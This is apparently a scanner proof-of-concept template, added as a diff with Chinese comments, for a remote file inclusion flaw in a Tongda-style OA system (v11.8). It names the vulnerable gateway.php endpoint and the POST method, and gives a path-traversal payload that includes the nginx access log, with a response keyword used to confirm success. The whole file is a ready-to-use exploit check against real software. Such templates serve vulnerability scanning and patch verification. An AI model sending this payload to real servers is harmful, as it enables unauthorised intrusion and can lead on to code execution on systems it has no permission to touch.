@@ -1,0 +1,36 @@
+#poc名称
+- name:
+  - name: "(2)AnywhereOA_v11.8_getway.php_remote_file_contains"
+
+#请求方式
+- method:
+  - method: "post"
+
+#漏洞的位置
+- url:
+  - url : "/ispirit/interface/gateway.php"
+
+#payload
+- payload:
+  - payload: 'json={"url":"/general/../../nginx/logs/oa.access.log"}'
+
+#response包里状态码
+- status:
+  - status: "200"
+
+#response包里的关键字
+- word:
+  - word:
+      - "ERROR"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#二次访问位置
+- verify:
+  - verify : "isNone"
+
+#cmd 为了适配Java反序列化漏洞
+- cmd:
+  - cmd : "isNone"
